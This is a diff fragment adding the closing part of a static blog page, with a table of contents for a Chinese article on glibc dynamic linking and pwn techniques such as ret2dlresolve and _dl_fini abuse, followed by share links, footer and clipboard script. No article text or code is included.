+        <ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#%E5%8A%A8%E6%80%81%E9%93%BE%E6%8E%A5"><span class="toc-number">1.</span> <span class="toc-text">动态链接</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%9C%BA%E5%88%B6"><span class="toc-number">1.1.</span> <span class="toc-text">机制</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%AE%9E%E7%8E%B0%E7%BB%93%E6%9E%84"><span class="toc-number">1.2.</span> <span class="toc-text">实现结构</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#interp%E6%AE%B5"><span class="toc-number">1.2.1.</span> <span class="toc-text">.interp段</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#dynamic%E6%AE%B5"><span class="toc-number">1.2.2.</span> <span class="toc-text">.dynamic段</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#DT-REL%E5%8A%A8%E6%80%81%E9%93%BE%E6%8E%A5%E9%87%8D%E5%AE%9A%E4%BD%8D%E8%A1%A8"><span class="toc-number">1.2.3.</span> <span class="toc-text">DT_REL动态链接重定位表</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#DT-SYMTAB-%E5%8A%A8%E6%80%81%E9%93%BE%E6%8E%A5%E7%AC%A6%E5%8F%B7%E8%A1%A8"><span class="toc-number">1.2.4.</span> <span class="toc-text">DT_SYMTAB 动态链接符号表</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#DT-STRTAB-%E5%8A%A8%E6%80%81%E9%93%BE%E6%8E%A5%E5%AD%97%E7%AC%A6%E4%B8%B2%E8%A1%A8"><span class="toc-number">1.2.5.</span> <span class="toc-text">DT_STRTAB 动态链接字符串表</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#link-map"><span class="toc-number">1.2.6.</span> <span class="toc-text">link_map</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%80%BB%E7%BB%93"><span class="toc-number">1.2.7.</span> <span class="toc-text">总结</span></a></li></ol></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#ret2dlresolve"><span class="toc-number">2.</span> <span class="toc-text">ret2dlresolve</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%8E%9F%E7%90%86"><span class="toc-number">2.1.</span> <span class="toc-text">原理</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E4%BE%8B"><span class="toc-number">2.2.</span> <span class="toc-text">例</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#64%E4%BD%8D%E6%83%85%E5%86%B5"><span class="toc-number">2.3.</span> <span class="toc-text">64位情况</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#dl-fini%E7%9A%84%E5%88%A9%E7%94%A8"><span class="toc-number">3.</span> <span class="toc-text">_dl_fini的利用</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E7%89%B9%E6%80%A7"><span class="toc-number">3.1.</span> <span class="toc-text">特性</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#HitconCTF2023-Wall-Sina"><span class="toc-number">3.2.</span> <span class="toc-text">HitconCTF2023 Wall-Sina</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#House-of-Blindness"><span class="toc-number">3.3.</span> <span class="toc-text">House of Blindness</span></a></li></ol></li></ol>
+      </div>
+    
+
+    <div id="share-footer" style="display: none">
+      <ul>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.facebook.com/sharer.php?u=http://deepunk.icu/dl%E7%9B%B8%E5%85%B3%E6%94%BB%E5%87%BB%E6%B1%87%E6%80%BB/"><i class="fab fa-facebook fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://twitter.com/share?url=http://deepunk.icu/dl%E7%9B%B8%E5%85%B3%E6%94%BB%E5%87%BB%E6%B1%87%E6%80%BB/&text=dl相关攻击汇总"><i class="fab fa-twitter fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.linkedin.com/shareArticle?url=http://deepunk.icu/dl%E7%9B%B8%E5%85%B3%E6%94%BB%E5%87%BB%E6%B1%87%E6%80%BB/&title=dl相关攻击汇总"><i class="fab fa-linkedin fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://pinterest.com/pin/create/bookmarklet/?url=http://deepunk.icu/dl%E7%9B%B8%E5%85%B3%E6%94%BB%E5%87%BB%E6%B1%87%E6%80%BB/&is_video=false&description=dl相关攻击汇总"><i class="fab fa-pinterest fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="mailto:?subject=dl相关攻击汇总&body=Check out this article: http://deepunk.icu/dl%E7%9B%B8%E5%85%B3%E6%94%BB%E5%87%BB%E6%B1%87%E6%80%BB/"><i class="fa-solid fa-envelope fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://getpocket.com/save?url=http://deepunk.icu/dl%E7%9B%B8%E5%85%B3%E6%94%BB%E5%87%BB%E6%B1%87%E6%80%BB/&title=dl相关攻击汇总"><i class="fab fa-get-pocket fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://reddit.com/submit?url=http://deepunk.icu/dl%E7%9B%B8%E5%85%B3%E6%94%BB%E5%87%BB%E6%B1%87%E6%80%BB/&title=dl相关攻击汇总"><i class="fab fa-reddit fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.stumbleupon.com/submit?url=http://deepunk.icu/dl%E7%9B%B8%E5%85%B3%E6%94%BB%E5%87%BB%E6%B1%87%E6%80%BB/&title=dl相关攻击汇总"><i class="fab fa-stumbleupon fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://digg.com/submit?url=http://deepunk.icu/dl%E7%9B%B8%E5%85%B3%E6%94%BB%E5%87%BB%E6%B1%87%E6%80%BB/&title=dl相关攻击汇总"><i class="fab fa-digg fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.tumblr.com/share/link?url=http://deepunk.icu/dl%E7%9B%B8%E5%85%B3%E6%94%BB%E5%87%BB%E6%B1%87%E6%80%BB/&name=dl相关攻击汇总&description=小pwn手不得不品的dl魔法"><i class="fab fa-tumblr fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://news.ycombinator.com/submitlink?u=http://deepunk.icu/dl%E7%9B%B8%E5%85%B3%E6%94%BB%E5%87%BB%E6%B1%87%E6%80%BB/&t=dl相关攻击汇总"><i class="fab fa-hacker-news fa-lg" aria-hidden="true"></i></a></li>
+</ul>
+
+    </div>
+
+    <div id="actions-footer">
+        <a id="menu" class="icon" href="#" onclick="$('#nav-footer').toggle();return false;"><i class="fa-solid fa-bars fa-lg" aria-hidden="true"></i> Menu</a>
+        
+          <a id="toc" class="icon" href="#" onclick="$('#toc-footer').toggle();return false;"><i class="fa-solid fa-list fa-lg" aria-hidden="true"></i> TOC</a>
+        
+        <a id="share" class="icon" href="#" onclick="$('#share-footer').toggle();return false;"><i class="fa-solid fa-share-alt fa-lg" aria-hidden="true"></i> Share</a>
+        <a id="top" style="display:none" class="icon" href="#" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');"><i class="fa-solid fa-chevron-up fa-lg" aria-hidden="true"></i> Top</a>
+    </div>
+
+  </div>
+</div>
+
+        
+        <footer id="footer">
+  <div class="footer-left">
+    Copyright &copy;
+    
+    
+    2021-2023
+    DeePunk
+  </div>
+  <div class="footer-right">
+    <nav>
+      <ul>
+        <!--
+       --><li><a href="/">Home</a></li><!--
+     --><!--
+       --><li><a href="/about/">About</a></li><!--
+     --><!--
+       --><li><a href="/archives/">Writing</a></li><!--
+     --><!--
+       --><li><a target="_blank" rel="noopener" href="http://github.com/DeePunk42">Projects</a></li><!--
+     -->
+      </ul>
+    </nav>
+  </div>
+</footer>
+
+    </div>
+    <!-- styles -->
+
+
+
+  <link rel="preload" as="style" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css" crossorigin="anonymous" onload="this.onload=null;this.rel='stylesheet'"/>
+
+
+    <!-- jquery -->
+
+  <script src="https://cdnjs.cloudflare.com/ajax/libs/jquery/3.6.0/jquery.min.js" crossorigin="anonymous"></script>
+
+
+
+
+<!-- clipboard -->
+
+  
+    <script src="https://cdnjs.cloudflare.com/ajax/libs/clipboard.js/2.0.7/clipboard.min.js" crossorigin="anonymous"></script>
+  
+  <script type="text/javascript">
+  $(function() {
+    // copy-btn HTML
+    var btn = "<span class=\"btn-copy tooltipped tooltipped-sw\" aria-label=\"Copy to clipboard!\">";
+    btn += '<i class="fa-regular fa-clone"></i>';
+    btn += '</span>';
+    // mount it!
+    $(".highlight table").before(btn);
+    var clip = new ClipboardJS('.btn-copy', {
+      text: function(trigger) {
+        return Array.from(trigger.nextElementSibling.querySelectorAll('.code')).reduce((str,it)=>str+it.innerText+'\n','')
+      }
+    });
+    clip.on('success', function(e) {
+      e.trigger.setAttribute('aria-label', "Copied!");
+      e.clearSelection();
+    })
+  })
+  </script>
+
+
+<script src="/js/main.js"></script>
+
+<!-- search -->
+
+<!-- Baidu Analytics -->
+
+<!-- Cloudflare Analytics -->
+
+<!-- Disqus Comments -->
+
+<!-- utterances Comments -->
+
+</body>
+</html>
